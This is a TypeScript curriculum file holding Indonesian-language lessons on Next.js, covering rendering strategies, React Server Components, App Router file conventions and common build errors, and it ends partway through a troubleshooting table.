import {
  callout,
  checklist,
  code,
  compare,
  divider,
  h2,
  ol,
  p,
  references,
  steps,
  table,
  terms,
  ul,
} from '@/lib/content/builders';
import { type LessonDraft, written } from '@/lib/curriculum/authoring';

/**
 * Frontend Intermediate — Chapter 8, all sixteen lessons.
 *
 * The closing chapter of the frontend track, and the bridge into Backend and Deployment: from
 * lesson 6 onward the reader is writing server code, so the security rules stop being abstract.
 *
 * Every API here targets Next.js 16 App Router. Where a signature changed in 15 or 16 (async
 * `params`/`searchParams`, explicit caching, proxy.ts), the lesson says so — a reader following an
 * older tutorial will otherwise write code that type-checks in their head and fails in the editor.
 */
export const lessons: LessonDraft[] = [
  written(
    'kenapa-nextjs',
    'Kenapa Next.js: SSR, SSG & RSC',
    20,
    'Masalah yang tidak bisa diselesaikan SPA murni.',
    [
      p(
        'React sendiri hanya library untuk membangun antarmuka. Ia tidak punya pendapat soal routing, pengambilan data, atau bagaimana halamanmu sampai ke pengguna. Next.js mengisi semua itu — dan alasannya bukan sekadar kenyamanan.',
      ),

      terms(
        {
          term: 'SPA',
          meaning:
            'Singkatan *Single Page Application* — **aplikasi satu halaman**. Server mengirim HTML kosong berisi satu `<div>`, lalu JavaScript yang membangun seluruh isinya di browser. Cepat saat berpindah halaman, tapi mahal saat pertama kali dibuka.',
        },
        {
          term: 'CSR',
          meaning:
            'Singkatan *Client-Side Rendering* — HTML dibuat **di browser**. Ini cara kerja SPA murni. Cocok untuk dasbor di balik login, di mana SEO tidak relevan dan penggunanya sudah menunggu memuat aplikasi.',
        },
        {
          term: 'SSR',
          meaning:
            'Singkatan *Server-Side Rendering* — HTML dibuat **di server, setiap kali ada permintaan**. Datanya selalu segar dan bisa berbeda per pengguna, tapi setiap kunjungan membebani server.',
        },
        {
          term: 'SSG',
          meaning:
            'Singkatan *Static Site Generation* — HTML dibuat **sekali saat build**, lalu disajikan sebagai berkas statis. Tercepat dan paling murah. Website yang sedang kamu baca memakai ini untuk 377 halamannya; progres belajarmu ditambahkan di browser dari `localStorage`.',
        },
        {
          term: 'hydration (hidrasi)',
          meaning:
            'Proses React "menghidupkan" HTML yang sudah dikirim server dengan menyambungkannya ke kode di browser. Kata kuncinya di sini: pada SSR klasik, hidrasi **menuntut kode komponennya ikut dikirim** — dan itulah yang diubah RSC.',
        },
        {
          term: 'RSC',
          meaning:
            'Singkatan *React Server Component*. Bukan sekadar SSR versi baru. Bedanya mendasar: pada SSR klasik komponen dirender di server **lalu kodenya tetap dikirim** untuk hidrasi; pada RSC, komponen server **tidak pernah dikirim sama sekali**.',
        },
        {
          term: 'payload RSC',
          meaning:
            'Format data yang dikirim server berisi hasil render Server Component. Ia bukan HTML biasa dan bukan JavaScript — ia deskripsi pohon yang React di browser tahu cara menempatkannya, tanpa perlu kode komponennya.',
        },
        {
          term: 'crawler',
          meaning:
            'Program mesin pencari atau layanan pratinjau tautan yang membaca halamanmu. Sebagian tidak menjalankan JavaScript sama sekali — jadi pada SPA murni, yang mereka lihat cuma `<div>` kosong. Ini alasan pratinjau di WhatsApp dan Slack sering kosong pada aplikasi SPA.',
        },
        {
          term: 'round trip (RTT)',
          meaning:
            'Satu siklus permintaan–balasan ke server. Biaya SPA murni terletak di sini, sebab pengguna menunggu **dua** round trip berurutan, yaitu satu untuk mengunduh bundle dan satu lagi untuk mengambil datanya, sebelum melihat apa pun.',
        },
      ),

      h2('Masalah SPA murni'),
      code(
        'text',
        `
        Permintaan ke server
          -> HTML kosong: <div id="root"></div>
          -> Unduh bundle JavaScript (bisa ratusan KB)
          -> Jalankan JavaScript
          -> Baru kirim permintaan data
          -> Baru ada yang terlihat
        `,
      ),
      ul(
        '**Layar kosong yang lama.** Pengguna menunggu dua perjalanan bolak-balik sebelum melihat apa pun.',
        '**SEO lemah.** Crawler yang tidak menjalankan JavaScript hanya melihat div kosong.',
        '**Pratinjau tautan kosong.** WhatsApp, Slack, dan Twitter membaca HTML — bukan hasil render JavaScript.',
        '**Perangkat lemah dihukum dua kali.** Ia harus mengunduh **dan** menjalankan semuanya.',
      ),

      h2('Tiga strategi rendering'),
      table(
        ['', 'CSR', 'SSR', 'SSG'],
        [
          ['HTML dibuat', 'Di browser', 'Di server, tiap permintaan', 'Saat build'],
          ['Waktu tampil pertama', 'Lambat', 'Sedang', '**Tercepat**'],
          ['Kesegaran data', 'Selalu baru', 'Selalu baru', 'Sesuai waktu build'],
          ['Beban server', 'Nol', 'Tinggi', 'Nol'],
          [
            'Cocok untuk',
            'Dasbor di balik login',
            'Data personal per pengguna',
            'Blog, dokumentasi, materi belajar',
          ],
        ],
      ),
      p(
        'Website yang sedang kamu baca memakai SSG untuk hampir semuanya. Materinya tidak berubah per pengguna, jadi 377 halamannya dibuat sekali saat build dan disajikan sebagai berkas statis. Progres belajarmu ditambahkan di browser dari `localStorage`.',
      ),

      h2('React Server Component: lapisan keempat'),
      p(
        'RSC bukan sekadar SSR versi baru. Bedanya mendasar: pada SSR klasik, komponen dirender di server **lalu kodenya tetap dikirim** ke browser untuk hidrasi. Pada RSC, komponen server tidak pernah dikirim sama sekali.',
      ),
      compare(
        {
          title: 'SSR klasik',
          lang: 'text',
          code: `
          Server: render <Artikel />
                  -> HTML
          Browser: unduh kode <Artikel />
                   -> hidrasi
                   -> siap

          Kode Artikel ada di kedua sisi.
          `,
          notes: ['Bundle tumbuh mengikuti jumlah komponen'],
        },
        {
          title: 'React Server Component',
          lang: 'text',
          code: `
          Server: render <Artikel />
                  -> HTML + payload RSC
          Browser: tampilkan
                   (kode Artikel TIDAK dikirim)

          Hanya komponen 'use client' yang dikirim.
          `,
          notes: ['Bundle tumbuh mengikuti jumlah komponen interaktif saja'],
        },
      ),
      p(
        'Baca kedua kolom sebagai **daftar apa yang diunduh browser**, karena di situlah perbedaannya. Pada SSR klasik, server merender `<Artikel />` menjadi HTML, tetapi browser tetap harus mengunduh kode komponen itu untuk melakukan hidrasi, yaitu memasang kembali seluruh logika React di atas HTML yang sudah ada. Jadi kodenya benar-benar ada di dua tempat, dan bundle tumbuh setiap kali kamu menambah komponen apa pun. Pada RSC, yang dikirim adalah HTML **plus payload RSC**, yaitu deskripsi hasil render dalam bentuk data dan bukan kode yang menghasilkannya. Kalimat di kurung menegaskan intinya, yaitu kode `Artikel` tidak pernah menyeberang. Konsekuensinya bukan sekadar bundle lebih kecil, melainkan **bundle yang berhenti tumbuh** untuk bagian aplikasi yang memang tidak interaktif.',
      ),
      callout(
        'info',
        'Konsekuensi praktisnya',
        'Library berat yang hanya dipakai untuk menampilkan sesuatu, misalnya pemformat tanggal, parser Markdown, dan penyorot sintaks, bisa dipakai di Server Component tanpa menambah satu byte pun ke bundle browser. Website ini memakai Shiki (penyorot kode) persis dengan cara itu.',
      ),
      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Toko daring dibangun dengan Vite dan React murni. Setelah dipakai, tiga masalah muncul yang tidak satu pun bisa diselesaikan di sisi klien. Halaman produk tidak muncul di hasil pencarian Google sebab isinya baru ada setelah JavaScript berjalan. Pengguna di jaringan seluler melihat layar putih selama dua detik sebelum apa pun tampil. Dan tautan produk yang dibagikan ke media sosial tidak menampilkan gambar maupun judulnya.',
      ),
      p(
        'Ketiganya berakar pada satu hal, yaitu HTML yang dikirim server kosong. Yang Next.js tambahkan bukan kemampuan React melainkan **kemampuan menjalankan sebagian kode di server**.',
      ),
      compare(
        {
          title: 'React murni di sisi klien',
          lang: 'html',
          code: `
          <!-- Yang dikirim server: -->
          <!doctype html>
          <html>
            <body>
              <div id="root"></div>
              <script src="/bundel.js"></script>
            </body>
          </html>

          <!-- Perayap mesin pencari melihat ini.
               Isinya baru ada setelah bundel.js diunduh,
               diurai, dijalankan, lalu memanggil API. -->
          `,
          notes: ['Layar putih sampai JavaScript selesai', 'Tautan yang dibagikan tanpa pratinjau'],
        },
        {
          title: 'Next.js dengan Server Component',
          lang: 'html',
          code: `
          <!-- Yang dikirim server: -->
          <!doctype html>
          <html>
            <body>
              <article>
                <h1>Kaos Polos Abu</h1>
                <p>Rp 89.000</p>
                <p>Bahan katun combed 30s...</p>
              </article>
              <script src="/bundel.js"></script>
            </body>
          </html>

          <!-- Isinya sudah ada sebelum satu baris JavaScript berjalan. -->
          `,
          notes: ['Terbaca perayap dan pratinjau tautan', 'Isi tampil sebelum JavaScript selesai'],
        },
      ),
      p(
        'Selisihnya bukan kecepatan JavaScript melainkan **kapan isinya ada**. Pada kolom kiri, isinya baru lahir setelah bundel diunduh, diurai, dijalankan, dan memanggil API. Pada kolom kanan, isinya sudah ada di HTML pertama yang tiba. Untuk perayap yang tidak menjalankan JavaScript, hanya kolom kanan yang berisi apa pun.',
      ),
      p(
        'Yang perlu jujur disebut, Next.js bukan jawaban untuk semua project. Ia menambah konsep yang harus dipahami, yaitu batas server dan klien, aturan cache, dan konvensi berkas. Untuk panel admin internal yang penggunanya sudah masuk dan tidak perlu terbaca mesin pencari, Vite dengan React saja lebih sederhana dan tidak kehilangan apa pun.',
      ),
      code(
        'text',
        `
        Kapan Next.js benar-benar menang:

        - Halaman harus terbaca mesin pencari
        - Tautan yang dibagikan harus punya pratinjau
        - Isi harus tampil cepat di jaringan lambat
        - Ada banyak halaman dengan alamat berbeda
        - Sebagian data hanya boleh diambil di server

        Kapan Vite dengan React saja sudah cukup:

        - Aplikasi internal di balik halaman masuk
        - Satu halaman tanpa rute
        - Alat yang dipakai tim sendiri
        - Tidak ada kebutuhan mesin pencari sama sekali
        `,
        { caption: 'Yang menentukan kebutuhan, bukan besarnya project.' },
      ),
      callout(
        'info',
        'Next.js tidak menggantikan React, ia membungkusnya',
        'Seluruh materi enam bab sebelumnya tetap berlaku penuh, yaitu komponen, props, state, hook, dan pantangan mutasi. Yang ditambahkan adalah rute berbasis berkas, kemampuan menjalankan komponen di server, dan aturan cache. Kalau ada yang terasa asing di bab ini, itu bagian Next.js-nya, bukan React-nya.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Empat kegagalan berikut dijalankan sungguhan dengan Next.js 16.2.12 yang terpasang di project ini, bukan disalin dari dokumentasi.',
      ),
      code(
        'text',
        `
        import { useState } from 'react';
        export default function Page() {
          const [n, setN] = useState(0);
          return <button onClick={() => setN(n + 1)}>{n}</button>;
        }

        Error: Turbopack build failed with 1 errors:
        ./app/page.tsx:1:10
        You're importing a module that depends on \`useState\` into a React Server
        Component module. This API is only available in Client Components. To fix,
        mark the file (or its parent) with the \`"use client"\` directive.
        `,
        { caption: 'Dijalankan sungguhan dengan Next.js 16.2.12.' },
      ),
      p(
        'Ini error pertama yang hampir semua orang temui, sebab bawaan App Router adalah Server Component. Pesannya menyebut perbaikannya secara langsung, dan justru di situ jebakannya. Menambahkan `use client` di puncak berkas memang menghilangkan errornya, sekaligus memindahkan seluruh isi berkas itu beserta yang diimpornya ke peramban. Pisahkan bagian interaktifnya lebih dulu.',
      ),
      code(
        'text',
        `
        'use client';
        export const metadata = { title: 'Halo' };

        You are attempting to export "metadata" from a component marked with
        "use client", which is disallowed. "metadata" must be resolved on the
        server before the page component is rendered.
        `,
        { caption: 'Dijalankan sungguhan. Metadata hanya bisa dari Server Component.' },
      ),
      p(
        'Metadata dipakai untuk menyusun tag di bagian kepala HTML, dan itu harus sudah selesai sebelum halamannya digambar. Karena Client Component baru berjalan di peramban, ia terlambat. Pesannya menyarankan jalan keluar yang tepat, yaitu biarkan halamannya Server Component dan pindahkan bagian interaktifnya ke berkas terpisah.',
      ),
      code(
        'text',
        `
        // Server Component mengirim fungsi ke Client Component
        <Tombol onKlik={() => console.log(id)} />

        # Build LOLOS. Errornya muncul saat halaman diminta:
        status HTTP: 500
        ⨯ Error: Event handlers cannot be passed to Client Component props.
        `,
        { caption: 'Dijalankan sungguhan. Ini error runtime, bukan error build.' },
      ),
      p(
        'Yang perlu diperhatikan, build **berhasil** dan errornya baru muncul saat halamannya diminta dengan status 500. Ini berarti kesalahan seperti ini bisa lolos ke produksi kalau halamannya tidak pernah dibuka saat pengujian. Props yang dikirim dari Server ke Client Component harus bisa diserialisasi, dan fungsi tidak bisa.',
      ),
      code(
        'text',
        `
        // lib/db.ts
        import 'server-only';

        // Diimpor dari berkas ber-'use client':
        You're importing a module that depends on "server-only". This API is only
        available in Server Components in the App Router, but you are using it in
        the Pages Router.
        `,
        { caption: 'Dijalankan sungguhan. Penjaga yang mencegah kredensial bocor ke peramban.' },
      ),
      p(
        'Paket `server-only` adalah penjaga yang sangat berharga, sebab tanpanya modul berisi kredensial database bisa ikut terkirim ke peramban tanpa satu pun tanda. Perhatikan pesannya menyebut Pages Router walaupun kamu memakai App Router, dan itu kekeliruan penulisan pesan di versi ini. Yang penting bagian pertamanya, yaitu modulnya hanya boleh dipakai di server.',
      ),
      table(
        ['Pesan', 'Kapan muncul', 'Perbaikannya'],
        [
          [
            '`importing a module that depends on \\`useState\\``',
            'Saat build',
            'Pisahkan bagian interaktif, beri `use client` di sana saja',
          ],
          [
            '`attempting to export "metadata" from a component marked with "use client"`',
            'Saat build',
            'Biarkan halamannya Server Component',
          ],
          [
            '`Event handlers cannot be passed to Client Component props`',
            '**Saat halaman diminta**, HTTP 500',
            'Pindahkan penanganya ke dalam Client Component',
          ],
          [
            '`importing a module that depends on "server-only"`',
            'Saat build',
            'Panggil dari Server Component, atau lewat Server Action',
          ],
          [
            'Bundel jauh lebih besar dari perkiraan',
            'Tidak ada pesan sama sekali',
            'Periksa letak `use client`, dan turunkan sedekat mungkin ke bagian interaktifnya',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Berpindah dari React murni ke Next.js mengubah bawaan yang sudah lama terbentuk, dan sebagian besar kesalahan berasal dari situ.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Menambahkan `use client` di puncak halaman untuk menghilangkan error',
            'Errornya langsung hilang',
            'Seluruh isi berkas beserta yang diimpornya ikut ke peramban. Pisahkan bagian interaktifnya saja',
          ],
          [
            'Mengira Server Component adalah fitur tambahan',
            'React biasanya di klien',
            'Di App Router ia adalah **bawaan**. Yang perlu ditandai justru komponen kliennya',
          ],
          [
            'Memakai Next.js untuk aplikasi internal tanpa kebutuhan mesin pencari',
            'Ia paling lengkap',
            'Menambah konsep yang harus dipahami tanpa manfaat. Vite dengan React lebih sederhana',
          ],
          [
            'Mengambil data dengan `useEffect` seperti biasa',
            'Itu cara yang sudah dikuasai',
            'Di App Router, pengambilan data di Server Component menghilangkan satu perjalanan bolak-balik dan keadaan kosong yang terlihat pengguna',
          ],
          [
            'Menganggap error runtime pasti tertangkap saat build',
            'Buildnya kan memeriksa',
            'Diuji sungguhan, error fungsi sebagai prop lolos build dan baru muncul sebagai HTTP 500. Buka halamannya saat menguji',
          ],
          [
            'Menyalin pola dari tutorial Pages Router',
            'Sama-sama Next.js',
            'Konvensi berkas, pengambilan data, dan batas server berbeda sepenuhnya. Pastikan tutorialnya memang App Router',
          ],
        ],
      ),
      p(
        'Baris terakhir layak diwaspadai karena Pages Router masih banyak dibahas di internet dan sebagian tulisannya tidak menyebutkan router mana yang dipakai. Penanda paling cepat, kalau tulisan itu memakai `getServerSideProps` atau `getStaticProps`, ia Pages Router. App Router tidak memakai keduanya sama sekali, dan pengambilan datanya langsung di dalam komponen.',
      ),
      callout(
        'tip',
        'Cara memeriksa apa yang benar-benar dikirim server',
        'Buka halamanmu lalu pilih View Source di peramban, bukan tab Elements. View Source menampilkan HTML asli dari server, sedangkan tab Elements menampilkan DOM setelah JavaScript berjalan. Kalau isi halamanmu tidak ada di View Source, perayap dan pratinjau tautan juga tidak akan melihatnya.',
      ),
      references(
        {
          label: 'Server Components',
          href: 'https://react.dev/reference/rsc/server-components',
          source: 'React',
          note: 'Perbedaan mendasar RSC dari SSR klasik, langsung dari sumbernya.',
        },
        {
          label: 'Rendering: Server-side Rendering',
          href: 'https://nextjs.org/docs/app/getting-started/server-and-client-components',
          source: 'Next.js',
          note: 'Bagaimana Next.js memadukan Server Component dengan komponen interaktif.',
        },
        {
          label: 'Static rendering & generateStaticParams',
          href: 'https://nextjs.org/docs/app/api-reference/functions/generate-static-params',
          source: 'Next.js',
          note: 'Mekanisme SSG yang dipakai membangun 377 halaman website ini saat build.',
        },
        {
          label: 'Rendering on the Web',
          href: 'https://web.dev/articles/rendering-on-the-web',
          source: 'web.dev',
          note: 'Perbandingan menyeluruh CSR, SSR, dan SSG beserta konsekuensinya bagi pengguna.',
        },
      ),
    ],
  ),

  written(
    'struktur-app-router',
    'Struktur App Router',
    22,
    'Konvensi file yang menentukan segalanya.',
    [
      p(
        'Di App Router, **struktur folder adalah routing**. Tidak ada file konfigurasi rute; nama folder menjadi URL, dan nama file menentukan perannya.',
      ),

      terms(
        {
          term: 'App Router',
          meaning:
            'Sistem routing Next.js yang berbasis folder `app/`. Prinsipnya satu kalimat: **struktur folder adalah routing**. Tidak ada berkas konfigurasi rute — nama folder menjadi URL, dan nama berkas menentukan perannya.',
        },
        {
          term: 'Pages Router',
          meaning:
            'Sistem routing Next.js yang lama, berbasis folder `pages/`. Masih didukung, tapi API-nya berbeda — `getServerSideProps`, `next/router`, tidak ada Server Component. Tutorial yang menyebut keduanya sedang membicarakan dua sistem, bukan satu.',
        },
        {
          term: 'page.tsx',
          meaning:
            'Berkas yang membuat sebuah folder **bisa diakses publik**. Ini titik yang sering membingungkan pemula: folder tanpa `page.tsx` bukan halaman — ia hanya bagian dari alamat, atau sekadar tempat menaruh berkas lain.',
        },
        {
          term: 'layout.tsx',
          meaning:
            'Pembungkus bersama untuk sebuah segmen dan seluruh turunannya. Sifat pentingnya: ia **tidak di-render ulang** saat pengguna berpindah antar anaknya. Itu sebabnya sidebar di website ini tidak melompat kembali ke atas saat kamu ganti sub-bab.',
        },
        {
          term: 'template.tsx',
          meaning:
            'Seperti layout, tapi **dipasang ulang** setiap navigasi — state di dalamnya kembali ke awal. Dipakai ketika kamu justru menginginkan itu, misalnya animasi masuk yang harus berjalan lagi di tiap halaman.',
        },
        {
          term: 'segment (segmen)',
          meaning:
            'Satu potongan alamat yang dipisahkan garis miring. Pada `/kelas/frontend-basic/oop`, segmennya adalah `kelas`, `frontend-basic`, dan `oop`. Tiap segmen bisa punya `layout`, `loading`, dan `error` sendiri.',
        },
        {
          term: 'colocation',
          meaning:
            'Menaruh berkas pendukung seperti komponen, helper, dan tes di **folder rute yang sama** dengan halaman yang memakainya. Cara ini aman karena hanya `page.tsx` dan `route.ts` yang membuat rute, dan sering lebih baik daripada memindahkannya ke `components/` yang jauh.',
        },
        {
          term: 'route group',
          meaning:
            'Folder yang namanya dibungkus tanda kurung, seperti `(pemasaran)`. Ia **tidak muncul di URL**. Gunanya: memberi dua kelompok halaman layout yang benar-benar berbeda tanpa memaksa keduanya berbagi prefiks alamat yang tidak berarti.',
        },
        {
          term: 'root layout',
          meaning:
            '`app/layout.tsx` — satu-satunya layout yang **wajib** ada, dan satu-satunya yang berisi tag `<html>` dan `<body>`. Semua halaman melewatinya, jadi apa pun yang kamu taruh di sini berlaku untuk seluruh situs.',
        },
      ),

      h2('Berkas khusus'),
      table(
        ['Berkas', 'Peran'],
        [
          ['`page.tsx`', 'Membuat rute bisa diakses publik. **Tanpa ini, folder bukan halaman.**'],
          [
            '`layout.tsx`',
            'Pembungkus bersama; **tidak di-render ulang** saat pindah antar anaknya',
          ],
          ['`loading.tsx`', 'Otomatis menjadi Suspense boundary untuk segmen ini'],
          ['`error.tsx`', 'Otomatis menjadi Error Boundary (wajib Client Component)'],
          ['`not-found.tsx`', 'Ditampilkan saat `notFound()` dipanggil'],
          ['`route.ts`', 'Membuat endpoint API, bukan halaman'],
          ['`template.tsx`', 'Seperti layout, tapi **dipasang ulang** setiap navigasi'],
        ],
      ),

      h2('Contoh struktur nyata'),
      code(
        'text',
        `
        src/app/
        ├── layout.tsx                    <- membungkus SEMUA halaman
        ├── page.tsx                      <- /
        ├── globals.css
        ├── kelas/
        │   ├── page.tsx                  <- /kelas
        │   └── [category]/
        │       ├── page.tsx              <- /kelas/frontend-basic
        │       └── [chapter]/
        │           └── [lesson]/
        │               └── page.tsx      <- /kelas/frontend-basic/oop/pengertian
        └── glosarium/
            └── page.tsx                  <- /glosarium
        `,
        { caption: 'Struktur rute website yang sedang kamu baca, disederhanakan.' },
      ),
      p(
        'Bandingkan kolom kiri dengan komentar alamat di kanannya, sebab **struktur folder adalah petanya**, tanpa satu pun berkas konfigurasi rute. Perhatikan `globals.css` dan `layout.tsx` tidak menghasilkan alamat apa pun, karena hanya `page.tsx` yang membuat sebuah folder bisa diakses, dan itu sebabnya folder `kelas/[category]/` punya `page.tsx` sendiri agar `/kelas/frontend-basic` tetap ada. Nama folder berkurung siku seperti `[category]` menandai **segmen dinamis**, sehingga satu berkas melayani semua kategori, dan nilainya diterima komponen sebagai parameter. Tiga tingkat bersarang di bawah `kelas/` menghasilkan alamat pelajaran yang panjang itu tanpa satu baris pun kode routing, dan menambah tingkat keempat cukup dengan membuat folder baru.',
      ),

      h2('Layout bersarang menumpuk'),
      code(
        'tsx',
        `
        // app/layout.tsx — root, wajib punya <html> dan <body>
        export default function RootLayout({ children }: { children: React.ReactNode }) {
          return (
            <html lang="id">
              <body>
                <Navigasi />
                {children}
              </body>
            </html>
          );
        }

        // app/kelas/layout.tsx — hanya untuk /kelas dan turunannya
        export default function LayoutKelas({ children }: { children: React.ReactNode }) {
          return (
            <div className="grid grid-cols-[240px_1fr]">
              <Sidebar />
              <main>{children}</main>
            </div>
          );
        }
        `,
      ),
      p(
        'Hasilnya: `RootLayout` > `LayoutKelas` > `page`. Saat pengguna berpindah dari satu pelajaran ke pelajaran lain, hanya `page` yang di-render ulang — sidebar dan navigasi tetap utuh, termasuk posisi scroll-nya.',
      ),
      callout(
        'tip',
        'Ini alasan sidebar tidak berkedip',
        'Di website ini, berpindah antar sub-bab tidak membuat sidebar melompat kembali ke atas. Itu bukan trik — itu konsekuensi langsung dari layout yang tidak di-render ulang.',
      ),

      h2('Colocation: berkas lain di folder rute'),
      code(
        'text',
        `
        app/kelas/
        ├── page.tsx           <- rute
        ├── kartu-kelas.tsx    <- komponen; TIDAK jadi rute
        ├── utils.ts           <- helper; TIDAK jadi rute
        └── page.test.tsx      <- tes; TIDAK jadi rute
        `,
      ),
      p(
        'Hanya `page.tsx` dan `route.ts` yang membuat rute. Berkas lain aman diletakkan di sebelahnya — dan itu sering lebih baik daripada memindahkannya ke folder `components/` yang jauh.',
      ),

      h2('Route group: mengelompokkan tanpa mengubah URL'),
      code(
        'text',
        `
        app/
        ├── (pemasaran)/
        │   ├── layout.tsx     <- layout khusus halaman pemasaran
        │   ├── page.tsx       <- /            (bukan /pemasaran)
        │   └── harga/page.tsx <- /harga
        └── (aplikasi)/
            ├── layout.tsx     <- layout khusus aplikasi
            └── dasbor/page.tsx <- /dasbor
        `,
      ),
      p(
        'Folder dalam tanda kurung tidak muncul di URL. Gunanya: memberi dua kelompok halaman layout yang benar-benar berbeda tanpa memaksa keduanya berbagi prefiks yang tidak berarti.',
      ),
      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Tim memindahkan aplikasi ke App Router dan menaruh seluruh komponen di dalam folder `app`. Setelah itu muncul rute yang tidak pernah dimaksudkan, yaitu `/komponen/Tombol` dan `/utils/format` bisa dibuka di peramban dan menampilkan halaman kosong. Penyebabnya satu, yaitu di App Router yang menentukan rute bukan keberadaan berkas melainkan **nama berkasnya**.',
      ),
      p(
        'Konvensi nama berkas adalah inti App Router, dan mengetahui daftarnya menghemat banyak kebingungan.',
      ),
      table(
        ['Nama berkas', 'Perannya', 'Wajib?'],
        [
          ['`page.tsx`', 'Membuat rute yang bisa diakses publik', 'Ya, untuk sebuah rute'],
          [
            '`layout.tsx`',
            'Pembungkus yang **tidak** digambar ulang saat rute anaknya berganti',
            'Satu di akar',
          ],
          ['`loading.tsx`', 'Batas Suspense otomatis untuk rute itu', 'Tidak'],
          ['`error.tsx`', 'Error boundary otomatis, wajib Client Component', 'Tidak'],
          ['`not-found.tsx`', 'Tampilan saat `notFound()` dipanggil', 'Tidak'],
          ['`route.ts`', 'Endpoint API, tidak bisa bersama `page.tsx`', 'Tidak'],
          ['`template.tsx`', 'Seperti layout, tapi **digambar ulang** tiap navigasi', 'Tidak'],
        ],
        'Berkas dengan nama lain tidak pernah menjadi rute, dan itu yang membuat komponen aman ditaruh di sana.',
      ),
      p(
        'Baris pertama menjelaskan kebingungan pada cerita di awal. Folder `app/komponen/Tombol.tsx` **tidak** membuat rute apa pun, sebab namanya bukan `page.tsx`. Yang membuat `/komponen/Tombol` bisa dibuka pastilah ada berkas bernama `page.tsx` di sana. Menaruh komponen di dalam `app` sepenuhnya aman selama namanya bukan salah satu konvensi di atas.',
      ),
      code(
        'text',
        `
        app/
          layout.tsx              -> pembungkus SELURUH aplikasi
          page.tsx                -> rute /
          loading.tsx             -> tampilan memuat untuk /

          (toko)/                 -> GRUP: tidak muncul di alamat
            layout.tsx            -> pembungkus khusus halaman toko
            produk/
              page.tsx            -> rute /produk
              [id]/
                page.tsx          -> rute /produk/7
                loading.tsx       -> memuat khusus halaman detail

          (admin)/                -> grup lain, layout berbeda
            layout.tsx
            pesanan/
              page.tsx            -> rute /pesanan

          _komponen/              -> folder privat, TIDAK pernah jadi rute
            Tombol.tsx
        `,
        { caption: 'Tanda kurung membuat grup, garis bawah membuat folder privat.' },
      ),
      p(
        'Folder dalam tanda kurung tidak muncul di alamat sama sekali. Gunanya memberi dua kelompok halaman layout yang berbeda tanpa mengubah alamatnya, misalnya halaman toko punya bilah navigasi pembeli dan halaman admin punya bilah samping. Tanpa grup, satu-satunya cara adalah menaruh percabangan di layout akar dan itu jauh lebih berantakan.',
      ),
      p(
        'Folder berawalan garis bawah adalah folder privat yang tidak pernah menjadi rute, apa pun isinya. Ini berguna kalau kamu ingin menegaskan bahwa isinya bukan halaman, walaupun sebenarnya berkas bernama selain konvensi di atas sudah aman dengan sendirinya.',
      ),
      p(
        'Perbedaan `layout` dan `template` sering ditanyakan dan jawabannya satu kalimat. Layout **tidak** digambar ulang saat berpindah antar-rute anaknya, sehingga state di dalamnya bertahan dan posisi gulirnya tetap. Template digambar ulang setiap kali, sehingga statenya direset. Pakai layout untuk bilah navigasi, dan template hanya kalau kamu memang butuh reset pada tiap navigasi.',
      ),
      callout(
        'warning',
        'Layout akar wajib memuat tag `html` dan `body`',
        'Berbeda dari layout lain, `app/layout.tsx` adalah satu-satunya tempat kedua tag itu boleh dan harus ada. Melupakannya membuat halamannya gagal dirender. Layout di dalam grup atau di dalam folder rute tidak boleh memuat keduanya lagi.',
      ),

      h2('Saat error-nya muncul'),
      p('Empat kegagalan berikut adalah yang paling sering saat menyusun struktur App Router.'),
      code(
        'text',
        `
        # app/produk/index.tsx dibuat, mengikuti kebiasaan Pages Router.
        # Membuka /produk menghasilkan 404.

        # Tidak ada error saat build. Rutenya memang tidak pernah ada.
        `,
        { caption: 'Nama berkas tidak mengikuti konvensi App Router.' },
      ),
      p(
        'Di Pages Router, `index.tsx` yang membuat rute. Di App Router, hanya `page.tsx`. Tidak ada error sebab berkas dengan nama lain memang sah, ia hanya bukan rute. Gejalanya berupa 404 untuk alamat yang kamu yakin sudah dibuat, dan hal pertama yang diperiksa adalah nama berkasnya.',
      ),
      code(
        'text',
        `
        # app/api/produk/ berisi route.ts DAN page.tsx

        Error: You cannot have two parallel pages that resolve to the same path.
        `,
        { caption: 'Dua berkas yang sama-sama menangani satu alamat.' },
      ),
      p(
        'Satu alamat hanya boleh ditangani satu hal, yaitu halaman atau endpoint API, tidak keduanya. Ini sering terjadi saat seseorang menambahkan `route.ts` ke folder yang sudah punya `page.tsx` untuk menyediakan API di alamat yang sama. Pisahkan alamatnya, misalnya halaman di `/produk` dan APInya di `/api/produk`.',
      ),
      code(
        'text',
        `
        # app/layout.tsx tanpa tag html dan body:
        export default function RootLayout({ children }) {
          return <div>{children}</div>;
        }

        # Halaman gagal dirender.
        `,
        { caption: 'Layout akar tidak memuat tag wajibnya.' },
      ),
      p(
        'Layout akar bertanggung jawab atas seluruh dokumen HTML, sehingga tag `html` dan `body` harus ada di sana. Ini berbeda dari layout lain yang hanya membungkus sebagian halaman dan tidak boleh memuat keduanya. Kalau kamu memindahkan isi layout akar ke grup, pastikan tag itu tetap tinggal di akar.',
      ),
      code(
        'text',
        `
        # Berpindah dari /produk ke /produk/7.
        # Kotak pencarian di layout kehilangan isinya.

        # Berkasnya bernama template.tsx, bukan layout.tsx.
        `,
        { caption: 'Template digambar ulang tiap navigasi, layout tidak.' },
      ),
      p(
        'Tidak ada error, dan gejalanya berupa state yang hilang saat berpindah halaman. Ini perbedaan yang menentukan antara keduanya, dan `template` sebenarnya jarang dibutuhkan. Kalau kamu tidak sengaja memilihnya, gejalanya persis seperti ini. Ganti menjadi `layout.tsx` kecuali kamu memang butuh reset pada tiap navigasi.',
      ),
      table(
        ['Gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '404 untuk alamat yang sudah dibuat',
            'Berkasnya bukan `page.tsx`',
            'Ganti namanya menjadi `page.tsx`',
          ],
          [
            '`You cannot have two parallel pages that resolve to the same path`',
            '`page.tsx` dan `route.ts` di folder yang sama',
            'Pisahkan alamatnya',
          ],
          [
            'Halaman gagal dirender',
            'Layout akar tidak memuat `html` dan `body`',
            'Tambahkan keduanya di `app/layout.tsx`',
          ],
          [
            'State di pembungkus hilang tiap navigasi',
            'Berkasnya `template.tsx`, bukan `layout.tsx`',
            'Ganti ke `layout.tsx`',
          ],
          [
            'Folder muncul di alamat padahal tidak diinginkan',
            'Nama foldernya tidak dibungkus tanda kurung',
            'Pakai grup, yaitu `(nama)`',
